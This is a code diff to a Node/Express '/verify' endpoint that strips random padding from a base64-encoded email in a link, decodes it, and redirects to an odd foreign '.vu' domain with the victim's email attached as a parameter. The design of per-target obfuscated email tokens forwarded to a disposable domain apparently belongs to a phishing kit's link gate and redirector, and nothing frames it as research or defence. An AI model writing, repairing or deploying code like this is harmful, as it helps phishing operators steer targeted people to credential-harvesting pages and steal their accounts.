@@ -123,7 +123,10 @@ app.post('/verify', async (req, res) => {
     const urlSegments = emailB64.split('/').filter(Boolean);
     const rawSegment = urlSegments[urlSegments.length - 1] || emailB64;
 
-    const decodedEmail = extractEmail(rawSegment);
+    // Strip the 6 random prefix characters and 8 random suffix characters
+    const cleanB64 = rawSegment.length > 14 ? rawSegment.substring(6, rawSegment.length - 8) : rawSegment;
+
+    const decodedEmail = extractEmail(cleanB64);
     if (!decodedEmail) {
         return res.status(400).json({ status: 'error', message: 'Invalid or missing secure email context.' });
     }
@@ -154,7 +157,7 @@ app.post('/verify', async (req, res) => {
             // Build the success redirect URL, attaching the email parameters
             const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
             const random_str = Math.random().toString(36).substring(2, 15);
-            const finalBaseUrl = baseUrl + '/' + random_str + '$' + encodeURIComponent(emailB64);
+            const finalBaseUrl = baseUrl + '/' + random_str + '$' + encodeURIComponent(cleanB64);
             const urlObj = new URL(finalBaseUrl);
             urlObj.searchParams.set('email', decodedEmail);
 
